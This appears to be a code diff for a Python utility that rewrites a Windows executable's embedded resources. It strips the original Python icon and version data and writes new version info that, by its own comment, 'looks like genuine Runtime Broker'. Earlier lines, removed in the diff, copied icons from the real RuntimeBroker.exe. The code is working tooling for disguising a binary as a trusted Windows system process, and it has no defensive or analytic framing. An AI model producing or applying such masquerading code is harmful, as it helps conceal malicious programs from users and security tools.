@@ -113,50 +113,15 @@ def _get_icon_ids(grp_data):
 
 # ── Main patch ─────────────────────────────────────────────────────
 
-def patch(exe, icon_src=None):
+def patch(exe):
     _setup_sigs()
-
-    # 1. Read old icon IDs from target so we can delete them
-    old_ids = []
-    h = _k32.LoadLibraryExW(exe, None, 2)
-    if h:
-        grp = _read_res(h, RT_GROUP_ICON, 1)
-        old_ids = _get_icon_ids(grp)
-        _k32.FreeLibrary(h)
-
-    # 2. Read new icons from system exe
-    new_grp = None
-    new_icons = {}
-    if icon_src:
-        h = _k32.LoadLibraryExW(icon_src, None, 2)
-        if h:
-            new_grp = _read_res(h, RT_GROUP_ICON, 1)
-            for nid in _get_icon_ids(new_grp):
-                d = _read_res(h, RT_ICON, nid)
-                if d: new_icons[nid] = d
-            _k32.FreeLibrary(h)
-
-    # 3. Begin update — wipe ALL existing resources (Python has many language variants)
+    # Wipe ALL existing resources (Python icon, version info, etc.)
     hu = _k32.BeginUpdateResourceW(exe, True)
     if not hu: return False
-
-    # 5. Write new icons
-    for nid, data in new_icons.items():
-        _k32.UpdateResourceW(hu, _mir(RT_ICON), _mir(nid), 0x0409, data, len(data))
-    if new_grp:
-        _k32.UpdateResourceW(hu, _mir(RT_GROUP_ICON), _mir(1), 0x0409, new_grp, len(new_grp))
-
-    # 6. Write version info
+    # Write clean version info — looks like genuine Runtime Broker
     ver = build_ver()
     _k32.UpdateResourceW(hu, _mir(RT_VERSION), _mir(1), 0x0409, ver, len(ver))
-
     return bool(_k32.EndUpdateResourceW(hu, False))
 
-
 if __name__ == "__main__":
-    exe = str(Path(sys.argv[1]).resolve())
-    # Use RuntimeBroker.exe icon by default
-    icon_src = r"C:\Windows\System32\RuntimeBroker.exe"
-    if len(sys.argv) > 2:
-        icon_src = sys.argv[2]
-    patch(exe, icon_src)
+    patch(str(Path(sys.argv[1]).resolve()))
